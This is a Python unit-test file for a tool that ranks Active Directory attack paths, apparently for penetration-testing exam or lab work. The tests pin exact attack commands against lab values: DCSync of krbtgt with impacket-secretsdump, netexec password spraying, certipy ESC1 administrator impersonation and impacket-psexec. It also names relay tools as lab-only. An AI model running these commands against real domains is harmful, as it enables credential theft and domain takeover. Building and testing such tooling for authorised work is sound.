"""Store -> correlate.run: the attack-path ranking is the product. Evidence is
built by hand (no file parsing) so these tests isolate the correlator and pin
the exact exam-legal command text the operator will paste."""
import unittest

from tests._helpers import (NT, BLANK_LM, BH_SRC, Store, Evidence, compliance,
                            ad_store, add_plaintext, add_nt, add_acl_edge, add_cert_template,
                            run_correlate)


def dcsync_store(cred="plaintext"):
    s = ad_store()
    (add_plaintext if cred == "plaintext" else add_nt)(s)
    add_acl_edge(s, "GetChangesAll")
    add_acl_edge(s, "GetChanges")
    return s


# ---- D2 slot: the first NEW orphaned-evidence rule ------------------------
# keyword.py emits Evidence(kind="admin") for every NetExec "(Pwn3d!)" row,
# but at HEAD core/correlate.py only consumes kind in ('host', 'service') for
# host context, so a confirmed local-admin cred never becomes a ranked chain.
# D2 is expected to ship R-PSEXEC for exactly this evidence.
D2_RULE = "R-PSEXEC"


def d2_store():
    s = ad_store()
    s.add(Evidence(kind="admin", user="jdoe", host="10.10.11.5", domain="corp.local",
                   source="/loot/dc01/nxc.txt", line=2,
                   meta={"hostname": "DC01", "protocol": "SMB", "cred_kind": "plaintext"}))
    add_plaintext(s)
    return s


class CorrelatorTests(unittest.TestCase):
    # 1
    def test_r_dcsync_plaintext_actor(self):
        chains, r = run_correlate(dcsync_store())
        ds = [c for c in chains if c.rule == "R-DCSYNC"]
        self.assertEqual(len(ds), 1, [c.summary for c in ds])   # GetChanges+GetChangesAll -> ONE chain
        c = ds[0]
        self.assertEqual(c.summary, "DCSync rights: jdoe on CORP.LOCAL (GetChanges + GetChangesAll)")
        self.assertEqual(c.score, 13.5)
        self.assertIs(c.lab_only, False)
        self.assertEqual(c.commands, [
            "# principal resolved -> 'jdoe'",
            "impacket-secretsdump -just-dc-user krbtgt 'corp.local/jdoe:Summer2024!'@10.10.11.5",
            "# with krbtgt hash, next: R-GOLDEN chain",
        ])
        self.assertEqual((c.src, c.line), (BH_SRC, 1))

    # 2
    def test_r_dcsync_hash_only_actor(self):
        chains, _ = run_correlate(dcsync_store("hash"))
        ds = [c for c in chains if c.rule == "R-DCSYNC"]
        self.assertEqual(len(ds), 1)
        self.assertEqual(ds[0].commands[1],
                         f"impacket-secretsdump -just-dc-user krbtgt -hashes '{BLANK_LM}:{NT}' "
                         f"'corp.local/jdoe'@10.10.11.5")

    # 3
    def test_r_dcsync_is_top_ranked_and_reported_critical(self):
        chains, r = run_correlate(dcsync_store())
        self.assertEqual(chains[0].rule, "R-DCSYNC")
        ac = r.cat("ATTACK CHAINS")
        self.assertEqual(ac[0]["severity"], "CRITICAL")
        self.assertTrue(ac[0]["detail"].startswith("[R-DCSYNC] DCSync rights: jdoe on CORP.LOCAL"), ac[0]["detail"])
        self.assertIn("(score 13.5)", ac[0]["detail"])
        self.assertEqual(ac[0]["hint"], "  ;  ".join(chains[0].commands))
        rules = {c.rule for c in chains}
        self.assertTrue(rules >= {"R1", "R9-BLIND", "R11-BLIND"}, sorted(rules))
        r1 = [c for c in chains if c.rule == "R1"][0]
        self.assertEqual(r1.commands[0],
                         "netexec smb 10.10.11.5 -u users.txt -p 'Summer2024!' --continue-on-success")

    # 4
    def test_r_dcsync_requires_creds_or_hash(self):
        s = ad_store()
        add_acl_edge(s, "GetChangesAll")
        add_acl_edge(s, "GetChanges")
        chains, _ = run_correlate(s)
        self.assertNotIn("R-DCSYNC", {c.rule for c in chains})

    # 5
    def test_r_adcs_esc1_with_plaintext(self):
        s = ad_store()
        add_plaintext(s)
        add_cert_template(s, "UserAuth", ["ESC1"])
        chains, _ = run_correlate(s)
        esc = [c for c in chains if c.rule == "R-ADCS-ESC1"]
        self.assertEqual(len(esc), 1)
        self.assertEqual(esc[0].score, 10.8)
        self.assertEqual(esc[0].commands[0],
                         "certipy-ad req -u 'jdoe@corp.local' -p 'Summer2024!' -ca 'corp-CA' "
                         "-template 'UserAuth' -upn 'administrator@corp.local' -dc-ip 10.10.11.5")
        self.assertEqual(esc[0].commands[1], "certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.5")

    # 6
    def test_esc8_lab_only_template_never_chains(self):
        s = ad_store()
        add_plaintext(s)
        add_cert_template(s, "WebServer", ["ESC8"], lab_only=True)
        chains, _ = run_correlate(s)
        self.assertFalse([c for c in chains if c.rule.startswith("R-ADCS")])
        self.assertFalse(any(c.lab_only for c in chains))
        for c in chains:
            for cmd in c.commands:
                self.assertFalse(compliance.needs_lab_tag(cmd), cmd)   # no Responder/ntlmrelayx ever
                self.assertFalse(compliance.is_denied(cmd), cmd)

    # 7
    def test_every_emitted_command_passes_lint_and_lab_only_invariants(self):
        stores = [dcsync_store(), dcsync_store("hash")]
        s = ad_store()
        add_plaintext(s)
        add_cert_template(s, "UserAuth", ["ESC1"])
        stores.append(s)
        for st in stores:
            chains, r = run_correlate(st)
            ac = r.cat("ATTACK CHAINS")
            for i, c in enumerate(chains):
                for cmd in c.commands:
                    ok, why = compliance.lint_command(cmd, tagged=c.lab_only)
                    self.assertTrue(ok, f"{c.rule}: {why}: {cmd}")
                if c.lab_only:
                    self.assertTrue(all(compliance.LAB_ONLY_TAG in cmd for cmd in c.commands))
                    self.assertNotEqual(i, 0)                      # never the top action
                    self.assertEqual(ac[i]["severity"], "MEDIUM")

    # 8
    def test_ranking_is_deterministic(self):
        a, _ = run_correlate(dcsync_store())
        b, _ = run_correlate(dcsync_store())
        key = lambda cs: [(c.rule, c.summary, c.score) for c in cs]
        self.assertEqual(key(a), key(b))
        scores = [c.score for c in a]
        self.assertEqual(scores, sorted(scores, reverse=True))

    # 9
    def test_empty_store_no_chains(self):
        chains, r = run_correlate(Store())
        self.assertEqual(chains, [])
        self.assertEqual(r.findings, [])

    # 10
    # iter-312: R-PSEXEC shipped (was expectedFailure).
    # kind='admin' evidence (only 'host'/'service'), so a confirmed Pwn3d! cred yields no
    # chain. Remove this decorator the moment the rule lands - an unexpected success fails.
    def test_new_d2_rule(self):
        chains, _ = run_correlate(d2_store())
        d2 = [c for c in chains if c.rule == D2_RULE]
        self.assertTrue(d2, f"no chain carries {D2_RULE}; present: {sorted({c.rule for c in chains})}")
        c = d2[0]
        self.assertIs(c.lab_only, False)
        self.assertTrue(any("impacket-psexec 'corp.local/jdoe:Summer2024!'@10.10.11.5" in cmd
                            or "-just-dc" in cmd for cmd in c.commands), c.commands)
        for cmd in c.commands:
            self.assertTrue(compliance.lint_command(cmd, tagged=False)[0], cmd)


if __name__ == "__main__":
    unittest.main()
